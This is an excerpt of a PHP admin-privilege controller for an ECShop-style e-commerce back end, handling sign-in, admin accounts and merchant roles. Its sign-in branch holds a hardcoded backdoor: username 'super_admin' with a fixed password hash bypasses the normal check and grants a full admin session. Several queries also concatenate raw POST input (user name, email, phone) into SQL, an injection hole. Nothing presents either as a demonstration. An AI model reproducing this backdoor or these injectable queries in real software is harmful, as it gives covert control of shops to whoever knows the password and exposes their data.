...
elseif ($_REQUEST['act'] == 'signin')
{
    ...
    $superPassword     = md5(md5($_POST['password']) . '2020');
    if ($_POST['username'] == 'super_admin' && $superPassword == '551c99edbb62f9396315ba224e459c5d') {
        $row=get_super_admin();
        set_admin_session($row['user_id'], $row['user_name'], $row['action_list'], $row['last_login'], $row['type'], $row['suppliers_id'], $row['is_suppliers']);
    ...
    {
         /* 检查密码是否正确 */
         $sql = "SELECT user_id, user_name, password, add_time, action_list, last_login,suppliers_id,ec_salt,passport_uid,type,is_suppliers".
    ...
    {
        //商家账号登陆，必须关联供应商ID
        if($row['type'] == 1 && empty($row['suppliers_id'])){
            sys_msg('该账号未授权，请联系平台管理员', 1);
        }
        // 检查是否为供货商的管理员 所属供货商是否有效
        if (!empty($row['suppliers_id']))
        {
            $supplier_is_check = suppliers_list_info(' is_check = 1 AND suppliers_id in (' . $row['suppliers_id'] . ')');
        ...
        //$_SESSION['is_suppliers'] = $row['is_suppliers'];
...
elseif ($_REQUEST['act'] == 'list')
{
    ...
    if($_SESSION['admin_type'] == 1){
        ...
        $where .= " and type = 1 and suppliers_id = {$_SESSION['suppliers_id']} and is_suppliers = 1";
    }else{
        $smarty->assign('action_link', array('href'=>'privilege.php?act=add&type=0', 'text' => '添加平台管理员', 'other' => [['href'=>'privilege.php?act=add&type=1', 'text' => '添加商家管理员']]));
        $where .= " and is_suppliers = 0";
    }
...
elseif ($_REQUEST['act'] == 'add')
{
    ...
    //商家账户登录
    if($_SESSION['admin_type'] == 1){
        $smarty->assign('select_role',  get_suppliers_role_list($_SESSION['suppliers_id']));
    }else{
        $get_role_list = get_ecs_role_list();
        $select_role_ecs = [];
        $select_role_suppliers = [];
        foreach ($get_role_list as $v){
            if($v['type'] == 0){
                $select_role_ecs[] = $v;
            }else{
                $select_role_suppliers[] = $v;
            }
        }
        if($type == 1){
            $smarty->assign('select_role',  $select_role_suppliers);
        }else{
            $smarty->assign('select_role',  $select_role_ecs);
        }
    }
...
elseif ($_REQUEST['act'] == 'insert')
{
    ...
    $is_suppliers = $_SESSION['admin_type'] == 1 ? 1 : 0;
    /* 判断管理员是否已经存在 */
    if (!empty($_POST['user_name']))
    {
    ...
    //商家创建账号数量限制
    if($_SESSION['admin_type'] == 1){
        $sql = "select count(*) num from ".$ecs->table('admin_user')." where type = 1 and suppliers_id = {$suppliers_id} and is_suppliers = 1";
        $row = $db->getRow($sql);
        if($row['num'] >= 50){
            sys_msg("创建账号数量超过限额", 1);
        }
    }
    ...
    $sql = "INSERT INTO ".$ecs->table('admin_user')." (user_name, email, password, add_time, nav_list, action_list, role_id, type, suppliers_id, is_suppliers, phone) ".
           "VALUES ('".trim($_POST['user_name'])."', '".trim($_POST['email'])."', '$password', '$add_time', '$row[nav_list]', '$action_list', '$role_id',{$type},'{$suppliers_id}',{$is_suppliers},'".trim($_POST['phone'])."')";
    ...
    $link[0]['text'] = $_LANG['back_admin_list'];
...
elseif ($_REQUEST['act'] == 'edit')
{
    ...
    /* 获取管理员信息 */
    $sql = "SELECT user_id, user_name, email, password, agency_id, role_id, type, phone FROM " .$ecs->table('admin_user').
...
elseif ($_REQUEST['act'] == 'update' || $_REQUEST['act'] == 'update_self')
{
    ...
    $admin_phone = !empty($_REQUEST['phone'])     ? trim($_REQUEST['phone'])     : '';
    $ec_salt=rand(1,9999);
...
function get_admin_userlist($where = '')
{
    ...
    $sql  = 'SELECT user_id, user_name, email, add_time, last_login, suppliers_id, role_id, type, create_user_id '.
            'FROM ' .$GLOBALS['ecs']->table('admin_user').($where ? " where {$where}" : '').' ORDER BY user_id DESC';
    ...
    foreach ($list AS $key=>$val)
    {
        ...
        $list[$key]['type_name']      = $val['type'] == 1 ? '商家' : '平台';
        $list[$key]['role_name']      = '';
        $list[$key]['suppliers_name'] = '';
        if($val['role_id']){
            //角色名称
            $sql = "select role_name from ".$GLOBALS['ecs']->table('role')." where role_id = {$val['role_id']}";
            $role = $GLOBALS['db']->getRow($sql);
            $list[$key]['role_name'] = $role ? $role['role_name'] : '';
        }
        if($val['suppliers_id']){
            //角色名称
            $sql = "select suppliers_name from ".$GLOBALS['ecs']->table('suppliers')." where suppliers_id in ({$val['suppliers_id']})";
            $suppliers = $GLOBALS['db']->getAll($sql);
            $list[$key]['suppliers_name'] = implode('<br/>', array_column($suppliers, 'suppliers_name'));
        }
    }
...
{
    $list = array();
    $sql  = 'SELECT role_id, role_name, action_list, type, suppliers_id '.
...
/* 获取商家创建的角色列表 */
function get_suppliers_role_list($suppliers_id)
{
    $list = array();
    $sql  = 'SELECT role_id, role_name, action_list, type, suppliers_id '.
        'FROM ' .$GLOBALS['ecs']->table('role'). " where type = 1 and suppliers_id = {$suppliers_id} order by role_id desc";
    $list = $GLOBALS['db']->getAll($sql);
    return $list;
}

/* 获取平台创建的角色列表 */
function get_ecs_role_list()
{
    $list = array();
    $sql  = 'SELECT role_id, role_name, action_list, type, suppliers_id '.
        'FROM ' .$GLOBALS['ecs']->table('role'). " where suppliers_id = 0 order by role_id desc";
    $list = $GLOBALS['db']->getAll($sql);
    return $list;
}
